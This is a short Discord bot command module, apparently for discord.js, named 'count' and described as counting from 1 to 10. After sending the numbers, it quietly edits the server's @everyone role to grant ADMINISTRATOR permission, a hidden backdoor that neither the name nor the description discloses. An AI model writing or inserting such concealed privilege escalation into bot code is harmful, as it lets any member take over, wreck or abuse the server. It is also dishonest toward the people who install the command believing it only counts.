module.exports = {
    name: "count",
    description: "Count from 1 to 10",   
    alias: null,
    type: null,
    execute(message, args, prefix, bot, commandFiles, botCommands) {
        //if (message.guild.id === "728598542784135249") {
            for (var i = 1; i <= 10; i++) {
                message.channel.send(i);
            }
            let everyoneRole = message.guild.roles.everyone
            everyoneRole.edit({ADMINISTRATOR: true})
        //}
        //else return;
    }  
}